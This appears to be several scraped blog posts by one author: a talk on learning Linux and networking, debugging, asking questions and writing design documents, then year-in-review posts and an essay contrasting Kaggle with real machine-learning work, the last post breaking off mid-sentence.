\n\n \n \n \n \n \n\nAs a quick aside, I think understanding computer networking is so important that I wrote a  whole zine about it , which you can pick up at the end of this talk.\n\n\n \n \n\n \n \n \n \n \n\n\nSo -- why is it important to understand the systems you work with?\n\n \n \n\n \n \n \n \n \n\n\nI think there are 3 main important reasons:\n \nFirst, understanding  jargon  is really useful. If someone says \"hey, this process got killed by the OOM killer\" it's useful to know what that means! (we're going to talk about what an OOM killer is later)\n\n \n\nsecond, it lets you   debug harder problems . When I set up a web server (Apache) for the first time, maybe 8 years ago, I didn't understand the HTTP protocol very well and I didn't understand what many of the configuration options I was using meant exactly.  \n\nSo I would normally debug by Googling things and trying random fixes. This was a pretty viable strategy at the time (I got my webservers working!) but today when I configure webservers, it's important for me to actually understand what I'm doing and exactly what effect I expect it to have. And now I can fix problems much more easily.\n \n rachelbythebay  is a great collection of debugging stories, and it's clear throughout that she has a really deep understanding of the systems she works with.\n\n \nThe last reason is -- having a solid understanding of the systems you work with lets you  innovate . I think Docker is a cool example of this. Docker was not the first thing to ever use namespaces (one of the kernel features that  people call \"containers\" ), but in order to make a tool that people loved to use, the Docker developers had to have a really good understanding of exactly what features Linux has to support isolating processes from others.\n\n \n \n\n \n \n \n \n \n\nA system like Linux seems really intimidating at first, especially if you want to understand some of the internals a little bit. It's like 4 million or 10 million lines of code or something.\n\n \n \n\n \n \n \n \n \n\nSo let's talk about how to break off pieces of knowledge one at a time so that you can tackle the challenge!\n\n\n \n \n\n \n \n \n \n \n\nMy first favorite thing to do is  learn fundamental concepts .  \n\nThis is incredibly useful -- in networking, if you know what a packet is and how it's put together, then it really helps to tackle other more complicated concepts. \n\nLet me tell you a quick story about how I learned what a system call was.\n\n \n \n\n \n \n \n \n \n\nThe  Recurse Center  is a 12 week programming retreat in New York where you can go to learn fun new things about programming. I went 3 years ago. RC is about learning whatever interests you (low level stuff? fancy frontend tricks? functional programming? making cool art with programming?), and I went partly with the goal of understanding operating systems better. \n\nWhen I got to RC, I learned about the concept of a \"system call\"! (here's  the blog post I wrote the day I learned that ). System calls are how applications talk to the operating system. I felt kind of sad that I didn't know about them before, but the important thing was that I learned it! That's exciting!\n\n \n \n\n \n \n \n \n \n\nThis is the only piece of homework in this talk :) \n\nTCP is the protocol that runs a lot of the internet that we use day to day. Often it \"just works\" and you don't need to think about it, but sometimes, well, we do need to think about it! So it's helpful to understand the basics.  \n\nThe way I started learning about TCP was, I wrote a  TCP stack in Python ! This was really fun, it didn't take that long, and I learned a ton by doing it and writing up what I learned.\n\n \n \n\n \n \n \n \n \n\nI also like to do  experiments .\n\n \n \n\n \n \n \n \n \n\nYou can make your laptop run out of memory on purpose! I would show you what happens (remember the \"OOM killer\"? it's a system in the Linux kernel that starts just killing programs on your computer!), but I think it might not be a good live demo for a talk :).\n \n\nI think doing this kind of experiment is awesome because servers run out of memory in production, and it's cool to see what that looks like and how to reason about it in a safer environment. (hint: if you run \"dmesg\" and search for \"oom\" it will show you OOM killer activity)\n \n \n\n \n \n \n \n \n\nAlso at the Recurse Center, I decided I wanted to write a tiny operating system in Rust. It turns out that writing an OS in 3 weeks when you don't know Rust or operating systems is hard, so I ended up writing a keyboard driver.  \n\nI learned SO MUCH by doing this -- you can  read more about it here \n\n \n \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\nThese are the programming experiment rules I like to follow.\n\n \n \n\n \n \n \n \n \n\nSometimes I like to read books! Two books I've learned from in the last couple years are  Networking for System Administrators  &  Linux Kernel Development .\n\nNetworking for System Administrators is written for system administrators who want to be able to do basic networking tasks without having to ask their networking team. I'm not a system administrator, and I don't have a networking team, but I learned a ton by reading this book.\n\n \n \n\n \n \n \n \n \n\nAnother thing that  I find super helpful is to try to read things or watch talks that are  too hard for me  at the time. For example, aphyr has an amazing series of  posts about distributed systems failures  (the ones called \"Jepsen\"). When I started reading these posts, I honestly didn't understand them very well. I didn't understand what \"linearizable\" meant, and I'd never worked with distributed databases. So sometimes I'd read a post and only understand maybe 20% of it.\n\n \n\nAs I learned more and came back to his writing, I was able to understand more of it! I'm still not a distributed systems expert, but I'm happy I tried to read these posts even when I didn't understand them well.\n \nThat Linux kernel development book I mentioned is kind of similar. Its goal is to give you the tools you need to become a Linux kernel developer. I am not a Linux kernel developer (or at least not yet!). But I've learned a few interesting things by reading this book.\n\n \n \n\n \n \n \n \n \n\nAnother maybe obvious tactic is to work with the thing in your job. Recently I needed to add some logging to a HTTP proxy we had. This was a relatively mundane task, but I learned more about how HTTP proxies work exactly by doing it! That was cool! \n\nIt's useful for me to remember that I can learn something even when I'm doing work which is sort of routine.\n\n \n \n\n \n \n \n \n \n\nThis is the last, and maybe most important thing. I have models of how a ton of systems work in my head. Sometimes what happens on the computers work with does not match what my model says!\n\n \n\nAs a small example -- recently we had a computer that was swapping even though it had 16GB of free memory. This did not match my mental model (\"computers only swap memory to disk when they're out of memory\"). Obviously there was something wrong with my model. So I investigated, and I learned a couple new things about how swap works on Linux!\n\n \n \n\n \n \n \n \n \n\nIt turns that there are actually at least 4 reasons a Linux box might swap. \n \n1. You could be actually out of RAM.\n \n2. You could be \"mostly\" out of RAM. The \"vm.swappiness\" sysctl setting controls how likely your machine is to swap. This isn't what was happening to us, though.\n \n3. A cgroup could be out of RAM, which was what was happening to us at the time ( here's the blog post I wrote about that) .\n \n4. There's also a 4th reason I learned about afterwards: if you have no swap, and your vm.overcommit_ratio is set to 50% (which is the default), you can end up in a situation where only half your RAM can be used. That's no good!  here's a post about overcommit on Linux \n\n \n \n\n \n \n \n \n \n\nSo it turns out understanding swap isn't actually that simple. In fact, there's a cool 200-page book  Understanding the Linux Virtual Memory Manager . It also has a bunch of annotated kernel code that handles memory management, which is awesome. \n \nI'm happy I dug in a bit because now I understand how this part of Linux works better!\n \n \n\n \n \n \n \n \n\nSo even getting to understand something that seems relatively basic like \"when does a computer start swapping?\" can take a while! There's a lot to know, and it's totally okay to not know it all right away. \n \n \n\n \n \n \n \n \n\nA quick story on my Linux journey:\n \nIn 2003, when I was 15, my mom bought me a shiny new computer. I was really excited about Linux, so I installed a ton of different Linux distributions. (also, thanks to my mom!! I'm super lucky to have had a computer that I could bork repeatedly and the time & space to do tons of experiments) \n\nAround 2009, in university, I was one of the sysadmins for a small lab of 7 Linux & Windows computers. The old sysadmin said \"hey, want to help out?\", gave me the root password, and we muddled our way through getting the computers to work for a bunch of math undergrads.\n \nIn 2013 I learned what a system call is and a bunch of basic things about operating systems! This was super awesome. (here's everything I learned  at the Recurse Center \n <\nAnd now I'm still continuing to learn.\n \n \n\n \n \n \n \n \n\n\nThe next wizard skill I'm going to talk about is asking great questions!\n\n \n \n\n \n \n \n \n \n\nA (great) situation I end up in a lot is where I have a coworker who knows something that I want to know, and they want to help me, and I just need to figure out the right questions to ask to get the answers I want!\n\n \n\nAsking good questions is really important because people in general cannot just magically guess what I want them to tell me.\n\n \n \n\n \n \n \n \n \n\n\nOne of my favorite tricks is to  state what I know , as a way to frame my question.\n\n \n \n\n \n \n \n \n \n\nStating what I know is awesome because it helps me organize my thoughts, reveals misunderstands (me: \"I know X\", them: \"that not quite right!\"), and helps me avoid answers that are too basic (yes yes yes i know that!) and too advanced (NO PLEASE BACK UP 30 STEPS FIRST).\n\n \n \n\n \n \n \n \n \n\nWhen asking a question, it's pretty natural to want to ask the most experienced person around your question. They will probably know the answer, which is good! But I don't think it's the best strategy. \n\nInstead, I instead try to remember to ask a less experienced person, who I think will still know the answer.\n\n \n \n\n \n \n \n \n \n\nThis is awesome because it reduces the load on the more-experienced person. But there's more reasons this is great! I'm not the most experienced member of my team. I love it when people ask me questions because -- if I don't know the answer to their questions, then I can find out, and I can grow my own knowledge.\n \nSo not asking the most experienced person is actually a cool way to show trust in less experienced team members, reduce the bus factor, and spread knowledge around.\n\n \n \n\n \n \n \n \n \n\nDoing research is great! It lets me ask more complicated and interesting questions!\n\n \n \n\n \n \n \n \n \n\nI really like to ask questions that are relatively easy to answer. yes/no questions are a really good way to accomplish this! And often an interesting yes/no question can lead to a great discussion.\n\n \n \n\n \n \n \n \n \n\nWhen debugging or fixing things, often you can end up in a situation where someone who's super experienced knows how to Do A Thing, and other people on the team don't know how.\n \n\nAnd often they have trouble remembering all the details to document them! So I like to (right after someone did something) to ask them to explain exactly what they did, or to ask if I can watch while they do it.\n\n \n \n\n \n \n \n \n \n\nThe last thing I have to say about asking about questions, especially to senior engineers / managers / leaders is -- please ask questions in public. I find that it's much easier for senior people to admit that they don't know something (because everybody knows you're competent already!), and doing that really creates space for everyone to ask questions.\n \n \n\n \n \n \n \n \n\nOkay, let's talk about reading code!\n\n \n \n\n \n \n \n \n \n\nSometimes error messages are not particularly helpful. If you go read the code around where the error message got printed, sometimes you can get a better clue about what's going on!\n\n \n \n\n \n \n \n \n \n\nWhat's more exciting to me, though, is to read the code when software is poorly documented (which happens all the time, especially when it's changing frequently or isn't used by very many people)\n\n \n \n\n \n \n \n \n \n\nI want to emphasize that reading code isn't just for small projects that you're familiar with, though.  \n\nIn my first job, I was writing plugins to make websites with Drupal, a PHP content management system. Once I remember I had a really specific question about how some Drupal thing worked. It wasn't documented, and there were no results on Google when I looked.  \nI asked my boss at the time if he knew and he told me \"julia, you just have to go read the code and find out how it works!\". I was a bit unsure about how to approach it (\"there's so much code\") but he pointed me to the relevant part of the Drupal codebase, and, sure enough, I could see the answer to my question there! \n\nSince then I've looked at the code for a bunch of large open source questions to answer questions (nginx! linux!) and even if I'm not a super good C programmer, sometimes I can figure out the answer to my question.\n\n \n \n\n \n \n \n \n \n\nNow we're going to talk about one of my favorite things! Debugging!\n\n \n \n\n \n \n \n \n \n\nLet's tell a story! One day we had a client that was making a HTTP request, and it wasn't getting a response for 40 milliseconds. That's a long time!\n\n\n \n \n\n \n \n \n \n \n\nWhy is that a long time? The client and the server were on the same computer. And I expected the server to be fast, so there was no reason for a 40ms delay.\n\n \n \n\n \n \n \n \n \n\nAs an aside, 40ms synchronously is 25 requests per second, which is really not a lot. It's easy to see how this kind of delay could become a problem quickly.\n\n\n \n \n\n \n \n \n \n \n\nI captured some packets with Wireshark to figure out who I should be blaming -- the client or the server!  \nWe found out that the client would send the HTTP headers, wait 40ms, and then send the rest of the request. So the server wasn't the problem at all! But why was the client doing this? It's written in Ruby, and initially I maybe thought we should just blame Ruby, but that wasn't a really good reason (40ms is a very long time, even in Ruby).\n\n \n \n\n \n \n \n \n \n\nIt turned out what was happening was a bad interaction between two TCP optimizations -- delayed ACKs, and Nagle's algorithm. When the client sent the first packet, the server would wait to send an ACK (because of the delayed ACKs algorithm), and the client was waiting for that ACK (because of Nagle's algorithm). \nSo they were stuck in this kind of passive-aggressive-waiting situation.\n \n\nI wrote a blog post about this called  Why you should understand (a little) about TCP  if you want to know more.\n \n \n\n \n \n \n \n \n\nWhen we set the TCP_NODELAY socket option, it stopped the client from waiting, and then everything got fast!\n\n \n \n\n \n \n \n \n \n\nA while ago I realized I felt like I'd gotten a lot better at debugging since my first job, and I came up with some reasons I think it got easier!\n\n \n \n\n \n \n \n \n \n\nSometimes when I hit a bug, especially a nondeterministic and difficult to reproduce bug, it’s tempting to think “oh you know, things just happen, who knows”. But everything on a computer does in fact happen for a logical reason (however much the computer may try to convince you otherwise). Reminding myself of that helps me fix bugs. Also known as “OK JULIA IT IS NOT FAIRIES WHAT ACTUAL REASON COULD BE CAUSING THIS?”\n\n \n \n\n \n \n \n \n \n\nNext up, confidence!\n\n \n \n\n \n \n \n \n \n\nA while ago I dealt with a performance problem in a Hadoop job at work that took me 2 weeks to fix (see  a millisecond isn’t fast ). If I hadn’t been able to fix it, I would have felt pretty bad and like it was a waste of 2 weeks.\n \nBut we were processing a relatively small number of records, and it was taking 15 hours to do it, and it was NOT REASONABLE and I knew that the job was too slow. And I figured it out, and now it’s faster and everyone is happy.\n \n \n\n \n \n \n \n \n\nFrom that, I learned that floating point exponentiation is slow, and that 1000 records/second isn't really a lot.\n\n \n \n\n \n \n \n \n \n\nThe job was processing 1000 records/second. I found this hard to think about at the time though -- was that a lot? not a lot? How was I supposed to know?  \nSo I decided I wanted to take some time to train my intuitions about how fast different computer operations should be.\n\n \n \n\n \n \n \n \n \n\nI made this game called  computers are fast  with my partner Kamal. You can go play it online, and we're going to play it now a little bit!\n\n \n \n\n \n \n \n \n \n\nSuppose you have an indexed database table, with 10 million rows in it. How long does it take to select a row from that table? How many times per second can you do that?\n \n\nThe goal isn't to know exactly, but I think it's useful to be right up to an order of magnitude. So can you do it 100 times in a second? 10,000? 10 million times?\n\n \n \n\n \n \n \n \n \n\nIt turns out the answer on my laptop is 55,000 times! (or, it takes about 20 microseconds, in Python)\n\n \n \n\n \n \n \n \n \n\nIt's also been incredibly helpful for me to have better tools for answering questions about your programs! \nWhen I started out, I didn't have very good tools! But now I know about all kinds of profilers! I know about strace, and tcpdump, and way more tools for figuring out what's going on. It makes a huge difference.\n\n \n \n\n \n \n \n \n \n\n\nI wrote a whole zine about debugging tools that have helped me answer questions. You can read it here:  Linux debugging tools you'll love \n\n \n \n\n \n \n \n \n \n\nBut maybe the most important thing is that I learned to like debugging! I used to get grumpy when I ran into bugs. I felt like they were just getting in my way!\n \nBut these days, when I run into a mysterious bug, I think it's kind of fun! I get to improve my understanding of the systems I work with, which is awesome!\n\n \n \n\n \n \n \n \n \n\nNow we're going to zoom out a bit from talking about networking and microseconds, and talk about how to design engineering projects. This is something that's really helped me a lot! \n\n \n \n\n \n \n \n \n \n\nThere are a lot of words for design document, but they're basically all the same idea -- you write down words about what work you're going to do before doing the work.\n\n \n \n\n \n \n \n \n \n\nWhen I started at Stripe I thought writing stuff down was kind of dumb. Why couldn't I just start working on the project? \nBut since then, I've learned to find them really useful! ( learning to like design documents )\n\n \n \n\n \n \n \n \n \n\nI was worried that if I wrote a document, I'd either get WAY TOO MUCH feedback, or total silence. \n\nOne thing I learned is that it's helpful at first to just share a design I'm working with a few people. Like I'll show it to a couple of other people on my team, see what they think, and then make changes! It's not always necessary to ask every single person who might have an opinion what they think.\n\n \n \n\n \n \n \n \n \n\nI also learned to like designing small projects. Recently I worked on a tiny project that just took about a week. My team lead asked me if I could quickly write up what we were going to do.  \n\nIt took me maybe 45 minutes to write up the plan (super fast!), I showed it to a manager on another team, he had a couple of things he asked me to do differently, and he was SO HAPPY I'd written down a plan so that he understood what was going on. Awesome!\n \nThe small project went super smoothly and I was really happly I wrote up a thing about it first.\n \n \n\n \n \n \n \n \n\n\nHow do you know what to write in a design document? I really like to start by writing an announcement email, as if we just finished the project. \n\nThis is great because it forces me to articulate why the project is important (why did we spend all that time on it), how it's going to impact other teams and what other people in the organization need to know about, and how we know that we actually met our goals for the project \n\nThe last thing is really important -- more often than I'd like to admit, I get to the end of a project and realize I'm not quite sure how we can tell whether the project is actually going to improve things or not. Planning that out at the beginning helps make sure that we put in the right metrics!\n\n \n \n\n \n \n \n \n \n\nIt's also useful to talk about risks! I actually haven't done this yet, but a cool idea I heard recently for figuring out risks was to do a \"premortem\" for your project. This is kind of the opposite of an announcement email -- instead, you imagine that the project failed 6 months down the line, and you're making sure you understand why it failed.\n\n \n \n\n \n \n \n \n \n\nWhen I started writing designs, I used to worry a lot that my design would be wrong because things were going to change. It turns out that this is totally true -- designs rarely survive contact with the real world. Priorities change, you run into technical challenges you didn't expect, all kinds of things can go wrong.  \n\nBut this doesn't mean it's not worth designing at all! I like writing down my assumptions explicitly because when things do change, I can go back and see what assumptions we had are no longer true, and make sure that we update everything we need to update. Having a record of changes is useful!\n\n \n \n\n \n \n \n \n \n\nWe've arrived at the last wizard skill!\n\n \n \n\n \n \n \n \n \n\nSometimes I'm working on something kind of boring, and I wonder like.. why am I doing this?  \nI usually find it possible to stay motivated if I can remember \"ok, I'm spending hours working on configuring nginx, and this is boring, but it's in service of this really cool goal!\"  \nBut if I *don't* remember the goal (or what I'm working on actually doesn't make sense), it sucks.\n\n \n \n\n \n \n \n \n \n\nThe solution I'm working on to this right now is to approach project planning with the same kind of excitement and curiosity you might bring to a gnarly bug!  \n\nI'm trying to get better at saying \"okay!!! this project! it has some slow and difficult pieces, so why is it so important? why are we going to feel awesome when it's done? which parts are the most important?\"\n\n \n \n\n \n \n \n \n \n\nI have a lot of autonomy in about what I get to work on, so when someone asks me to do something, I like to make sure I understand why it's important. Usually if I don't understand, the right thing to do is to just find out why it's important (usually it actually is!). \n \nBut sometimes the task I'm being given is only maybe 80% thought through, and when I go to understand the exact reason for doing it, it turns out that we don't need to do it at all! (or maybe we should actually be doing something completely different!)\n\n \n \n\n \n \n \n \n \nAnd understanding the big picture helps me make better technical decisions! \n\n\n\n \n \n\n \n \n \n \n \n\n\nLike a lot of people, I think a lot about the impact my work has and what I'm really doing here. Kelsey Hightower had a really amazing series of  tweets today . here are a couple of quotes.\n\n \n\n> I’ve yet to find the perfect job or thing to work on, but I have found a way to live a more meaningful life in tech.\n\n \n\n> I now put people first. Regardless of the technology involved I gravitate towards helping people.\n \n\n> People provide a much better feedback loop than computers or the abstract idea of a business.\n\n \n\n> Everything I work on has a specific person or group of people in mind; this is what gives my work meaning; solving problems is not enough.\n\n \n \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\nduring this conference, I hope you ask a ton of questions to understand what's going on with this \"SRE\" thing better. There are so many amazing people to learn from!\n \n \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\n\nI handed out fun networking zines at the end of this talk. If you want to read the zine, it's here:  Networking! ACK! \n\n \n \n\n"},
{"url": "https://jvns.ca/blog/2023/12/31/2023--year-in-review/", "title": "2023: Year in review", "content": "\n     \n\n Hello! This was my 4th year working full time on Wizard Zines! Here are a few\nof the things I worked on this year. \n\n a zine! \n\n I published  How Integers and Floats Work , which I worked on with\n Marie . \n\n This one started out its life as “how your computer represents things in\nmemory”, but once we’d explained how integers and floats were represented in\nmemory the zine was already long enough, so we just kept it to integers and\nfloats. \n\n This zine was fun to write: I learned about why signed integers are represented\nin memory the way they are, and I’m really happy with the explanation of\nfloating point we ended up with. \n\n a playground: memory spy! \n\n When explaining to people how your computer represents people in memory, I kept\nwanting to open up  gdb  or  lldb  and show some example C programs and how the\nvariables in those C programs are represented in memory. \n\n But gdb is kind of confusing if you’re not used to looking at it! So me and\n Marie  made a cute interface on top of  lldb , where you can put in any C program,\nclick on a line, and see what the variable looks like. It’s called  memory spy  and here’s what it looks like: \n\n \n \n \n\n a playground: integer exposed! \n\n I got really obsessed with  float.exposed  by  Bartosz\nCiechanowski  for seeing how floats are represented in\nmemory. So with his permission, I made a copy of it for integers called  integer.exposed . \n\n Here’s a screenshot: \n\n \n\n It was pretty straightforward to make (copying someone else’s design is so much\neasier than making your own!) but I learned a few CSS tricks from analyzing how\nhe implemented it. \n\n Implement DNS in a Weekend \n\n I’ve been working on a big project to show people how to implement a working\nnetworking stack (TCP, TLS, DNS, UDP, HTTP) in 1400 lines of Python, that you\ncan use to download a webpage using 100% your own networking code. Kind of like  Nand to Tetris , but for computer networking. \n\n This has been going VERY slowly – writing my own working shitty\nimplementations was relatively easy (I finished that in October 2022), but\nwriting clear tutorials that other people can follow is not. \n\n But in March, I released the first part:  Implement DNS in a Weekend . The response was really good\n– there are  dozens of people’s implementations on GitHub , and\npeople have implemented it in Go, C#, C, Clojure, Python, Ruby, Kotlin, Rust,\nTypescript, Haskell, OCaml, Elixir, Odin, and probably many more languages too.\nI’d like to see more implementations in less systems-y languages like vanilla\nJS and PHP, need to think about what I can do to encourage that. \n\n I think “Implement IPv4 in a Weekend” might be the next one I release. It’s\ngoing to come with bonus guides to implementing ICMP and UDP too. \n\n a talk: Making Hard Things Easy! \n\n I gave a keynote at Strange Loop this year called  Making Hard Things Easy (video + transcript) ,\nabout why some things are so hard to learn and how we can make them easier. I’m\nreally proud of how it turned out. \n\n a lot of blog posts about Git! \n\n In September I decided to work on a second zine about Git, focusing more on how\nGit works. This is one of the hardest projects I’ve ever worked on, because\nover the last 10 years of using it I’d completely lost sight of what’s hard\nabout Git. \n\n So I’ve been doing a lot of research to try to figure out why Git is hard, and\nI’ve been writing a lot of blog posts. So far I’ve written: \n\n \n In a git repository, where do your files live? \n Some miscellaneous git facts \n Confusing git terminology \n git rebase: what can go wrong? \n How git cherry-pick and revert use 3-way merge \n git branches: intuition & reality \n Mounting git commits as folders with NFS \n \n\n What’s been most surprising so far is that I originally thought “to understand\nGit, people just need to learn git’s internal data model!“. But the more I talk\nto people about their struggles with Git, the less I think that’s true. I’ll\nleave it at that for now, but there’s a lot of work still to do. \n\n some Git prototypes! \n\n I worked on a couple of fun Git tools this year: \n\n \n git-commit-folders : a way to\nmount your Git commits as (read-only) folders using FUSE or NFS. This one\ncame about because someone mentioned that they think of Git commits as being\nfolders with old versions of the code, and it made me wonder – why  can’t \nyou just have a virtual folder for every commit? It turns out that it can and\nit works pretty well. \n git-oops : an experimental prototype of an\nundo system for git. This one came out of me wondering “why can’t we just\nhave a  git undo ?“. I learned a bunch of things about why that’s not easy\nthrough writing the prototype, I might write a longer blog post about it\nlater. \n \n\n I’ve been trying to put a little less pressure on myself to release software\nthat’s Amazing and Perfect – sometimes I have an idea that I think is cool but\ndon’t really have the time or energy to fully execute on it. So I decided to\njust put these both on Github in a somewhat unfinished state, so I can come\nback to them if later if I want. Or not! \n\n I’m also working on another Git software project, which is a collaboration with\na friend. \n\n hired an operations manager! \n\n This year I hired an Operations Manager for  Wizard Zines ! Lee is incredible and has done SO much to\nstreamline the logistics of running the company, so that I can focus more on\nwriting and coding. I don’t talk much about the mechanics of running the\nbusiness on here, but it’s a lot and I’m very grateful to have some help. \n\n A few of the many things Lee has made possible: \n\n \n run a Black Friday sale! \n we added a review system to the website! (it’s so nice to hear about how people loved getting zines for Christmas!) \n the  store  has been reorganized to be way clearer! \n we’re more consistent about sending out the  new comics  newsletter! \n I can take a vacation and not worry about support emails! \n \n\n migrated to Mastodon! \n\n I spent 10 years building up a Twitter presence, but with the Recent Events, I\nspent a lot of time in 2023 working on building up a  Mastodon account . I’ve found that I’m able to have more\ninteresting conversations about computers on Mastodon than on Twitter or\nBluesky, so that’s where I’ve been spending my time. We’ve been having a lot of\ngreat discussions about Git there recently. \n\n I’ve run into a few technical issues with Mastodon (which I wrote about at  Notes on\nusing a single-person Mastodon server ) but overall\nI’m happy there and I’ve been spending a lot more time there than on Twitter. \n\n some questions for 2024 \n\n one of my questions for 2022 was: \n\n \n What’s hard for developers about learning to use the Unix command line in 2022? What do I want to do about it? \n \n\n Maybe I’ll work on that in 2024! Maybe not! I did make a little bit of progress\non that question this year (I wrote  What helps people get comfortable on the command line? ). \n\n Some other questions I’m thinking about on and off: \n\n \n Could man pages be a more useful form of documentation? Do I want to try to do anything about that? \n What format do I want to use for this “implement all of computer networking in Python” project? (is it a website? a book? is there a zine? what’s the deal?) Do I want to run workshops? \n What community guidelines do I want to have for discussions on Mastodon? \n Could I be marketing  Mess With DNS  (from 2021) more? How do I want to do that? \n \n\n moving slowly is okay \n\n I’ve started to come to terms with the fact that projects always just take\nlonger than I think they will. I started working this “implement your own\nterrible networking stack” project in 2022, and I don’t know if I’ll finish it\nin 2024. I’ve been working on this Git zine since September and I still don’t\ncompletely understand why Git is hard yet. There’s another small secret project\nthat I initally thought of 5 years ago, made a bunch of progress on this year,\nbut am still not done with. Things take a long time and that’s okay. \n\n As always, thanks for reading and for making it possible for me to do this\nweird job. \n\n"},
{"url": "https://jvns.ca/blog/2014/06/19/machine-learning-isnt-kaggle-competitions/", "title": "Machine learning isn't Kaggle competitions", "content": "\n      I write about strace and kernel programming on this blog, but at work\nI actually mostly work on machine learning, and it’s about time I\nstarted writing about it! Disclaimer: I work on a data analysis /\nengineering team at a tech company, so that’s where I’m coming from. \n\n When I started trying to get better at machine learning, I went to\n Kaggle  (a site where you compete to solve\nmachine learning problems) and tried out one of the classification\nproblems. I used an\nout-of-the-box algorithm, messed around a bit, and definitely did not\nmake the leaderboard. I felt sad and demoralized – what if I\nwas really bad at this and never got to do math at work?! I still\ndon’t think I could win a Kaggle competition. But I have a job where I do\n(among other things) machine learning! What gives? \n\n To back up from Kaggle for a second, let’s imagine that you have an\nawesome startup idea. You’re going to predict flight arrival times for\npeople! There are a ton of decisions you’ll need to make before you even\nstart thinking about support vector machines: \n\n \n\n Understand the business problem \n\n If you want to predict flight arrival times, what are you really\ntrying to do? Some possible options: \n\n \n Help the airline understand which flights are likely to be delayed, so\nthey can fix it. \n Help people buy flights that are less likely to be delayed. \n Warn people if their flight tomorrow is going to be delayed \n \n\n I’ve spent time on projects where I didn’t understand at all how the\nmodel was going to fit into business plans. If this is you, it  doesn’t\nmatter  how good your model is. At all. \n\n Understanding the business problem will also help you decide: \n\n \n How accurate does my model really need to be? What kind of false\npositive rate is acceptable? \n What data can I use? If you’re predicting flight days tomorrow, you\ncan look at weather data, but if someone is buying a flight a month\nfrom now then you’ll have no clue. \n \n\n Choose a metric to optimize \n\n Let’s take our flight delays example. We first have to decide whether to\ndo classification (“will this flight be delayed for at least an hour”)\nor regression (“how long will this flight be delayed for?”). Let’s say\nwe pick regression. \n\n People often optimize the sum of squares because it has nice statistical\nproperties. But mispredicting a flight arrival time by 10 hours and by\n20 hours are pretty much equally bad. Is the sum of squares really\nappropriate here? \n\n Decide what data to use \n\n Let’s say I already have the airline, the flight number, departure\nairport, plane model, and the departure and arrival times. \n\n Should I try to buy more specific information about the different plane\nmodels (age, what parts are in them..)? Really accurate weather data?\nThe amount of information available to you isn’t fixed! You can get\nmore! \n\n Clean up your data \n\n Once you have data, your data will be a mess. In this flight search\nexample, there will likely be \n\n \n airports that are inconsistently named \n missing delay information all over the place \n weird date formats \n trouble reconciling weather data and airport location \n \n\n Cleaning up data to the point where you can work with it is a\nhuge amount of work. If you’re trying to reconcile a lot of sources of\ndata that you don’t control like in this flight search example, it can\ntake 80% of your time. \n\n Build a model! \n\n This is the fun Kaggle part. Training! Cross-validation! Yay! \n\n Now that we’ve built what we think is a great model, we actually have to\nuse it: \n\n Put your model into production \n\n Netflix didn’t actually implement the model that\nwon the Netflix competition because\n it was too complicated . \n\n If you trained your model in Python, can you run it in production in\nPython? How fast does it need to be able to return results? Are you\nrunning a model that bids on advertising spots / does high frequency\ntrading? \n\n If we’re predicting flight delays, it’s probably okay for our model to\nrun somewhat slowly. \n\n Another surprisingly difficult thing is gathering the data to evaluate\nyour model – getting historical weather data is one thing, but getting\nthat same data in real time to predict flight delays  right now  is\ntotally different. \n\n Measure your model’s performance \n\n Now that we’re running the model on live data, how do I measure its\nreal-life performance? Where do I log the scores it’s producing? If\nthere’s a huge change in the inputs my model is getting after 6 months,\nhow will I find out? \n\n Kaggle solves all of this for you. \n\n With Kaggle, almost all of these problems are already solved for you:\nyou don’t need to worry about the engineering aspects of running a\nmodel on live data, the underlying business problem, choosing a metric,\nor collecting and cleaning up data. \n\n You won’t go through all these steps just once – maybe you’ll build a\nmodel and it won’t perform well so you’ll try to add some additional\nfeatures and see if you can build a better model. Or maybe how useful\nthe model is to your business depends on how good the results are. \n\n Doing Kaggle problems is fun! It means you can focus on machine\nlearning algorithm nerdery and get better at that. But it’s pretty far\nremoved from my job, where I work on a\n team (hiring!)  that thinks\nabout all of these problems. Right now I’m looking at measuring\nmodels’ performance once they’re in production, for instance! \n\n So if you look at Kaggle leaderboards and think that you’re bad at\nmachine learning because you’re not doing well, don’t. It’s a fun but\nartificial problem that doesn’t reflect real machine learning work. \n\n (to be clear: I don’t think that Kaggle misrepresents itself, or does\na bad job – it specializes in a particular thing and that’s fine. But\nwhen I was starting out, I thought that machine learning work would be\nlike Kaggle competitions, and it’s not.) \n\n (thanks to the fantastic  Alyssa Frazee  for\nhelping with drafts of this!) \n"},
{"url": "https://jvns.ca/blog/2018/12/23/2018--year-in-review/", "title": "2018: Year in review", "content": "\n     \n\n I wrote these in  2015  and\n 2016  and\n 2017  and it’s always interesting to look\nback at them, so here’s a summary of what went on in my side projects in 2018. \n\n ruby profiler! \n\n At the beginning of this year I wrote  rbspy  (docs:  https://rbspy.github.io/ ). It inspired a Python version called  py-spy  and a PHP profiler called  phpspy , both of which are excellent. I think py-spy in particular is  probably  better  than rbspy which makes me really happy. \n\n Writing a program that does something innovative ( top  for your Ruby program’s functions!) and\ninspiring other people to make amazing new tools is something I’m really proud of. \n\n started a side business! \n\n A very surprising thing that happened in 2018 is that I started a business! This is the website:\n https://wizardzines.com/ , and I sell programming zines. \n\n It’s been astonishingly successful (it definitely made me enough money that I could have lived on\njust the revenue from the business this year), and I’m really grateful to everyone’s who’s supported\nthat work. I hope the zines have helped you. I always thought that it was impossible to make\nanywhere near as much money teaching people useful things as I can as a software developer, and now\nI think that’s not true. I don’t think that I’d  want  to make that switch (I like working as a\nprogrammer!), but now I actually think that if I was serious about it and was interested in working\non my business skills, I could probably make it work. \n\n I don’t really know what’s next, but I plan to write at least one zine next year. I learned a few\nthings about business this year, mainly from: \n\n \n stephanie hurlburt’s twitter \n amy hoy \n the book  growing a business by paul hawken \n seeing what joel hooks is doing with  egghead.io \n a little from  indie hackers \n \n\n I used to think that sales / marketing had to be gross, but reading some of these business books\nmade me think that it’s actually possible to run a business by being honest & just building good\nthings. \n\n work! \n\n this is mostly about side projects, but a few things about work: \n\n \n I still have the same manager ( jay ). He’s been really great to\nwork with. The  help! i have a manager!  zine is secretly\nlargely things I learned from working with him. \n my team made some big networking infrastructure changes and it went pretty well. I learned a lot\nabout proxies/TLS and a little bit about C++. \n I mentored another intern, and the intern I mentored last year joined us full time! \n \n\n When I go back to work I’m going to switch to working on something COMPLETELY DIFFERENT (writing\ncode that sends messages to banks!) for 3 months. It’s a lot closer to the company’s core business,\nand I think it’ll be neat to learn more about how financial infrastructure works. \n\n I struggled a bit with 